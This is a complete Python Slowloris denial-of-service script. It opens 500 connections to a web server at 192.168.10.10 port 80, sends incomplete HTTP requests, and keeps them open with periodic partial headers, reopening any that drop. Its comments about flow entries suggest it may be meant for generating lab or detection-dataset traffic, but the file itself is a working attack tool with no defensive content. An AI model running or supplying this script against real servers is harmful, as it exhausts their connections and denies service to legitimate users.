import socket
import time

TARGET_IP   = '192.168.10.10'
TARGET_PORT = 80
SOCKET_COUNT = 500   # more open connections = more flow entries
INTERVAL     = 3     # more frequent keepalives = more packet activity

sockets = []
print(f'[slowloris] Opening {SOCKET_COUNT} connections to {TARGET_IP}:{TARGET_PORT}...')

for _ in range(SOCKET_COUNT):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(30)
        s.connect((TARGET_IP, TARGET_PORT))
        s.send(f'GET / HTTP/1.1\r\nHost: {TARGET_IP}\r\n'.encode())
        sockets.append(s)
    except Exception:
        pass

print(f'[slowloris] {len(sockets)} connections established. Sending keepalives every {INTERVAL}s...')

while True:
    dead = []
    for s in sockets:
        try:
            s.send(b'X-a: b\r\n')
        except Exception:
            dead.append(s)

    # Remove dead sockets and try to reopen them
    for s in dead:
        sockets.remove(s)
        try:
            s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s2.settimeout(30)
            s2.connect((TARGET_IP, TARGET_PORT))
            s2.send(f'GET / HTTP/1.1\r\nHost: {TARGET_IP}\r\n'.encode())
            sockets.append(s2)
        except Exception:
            pass

    time.sleep(INTERVAL)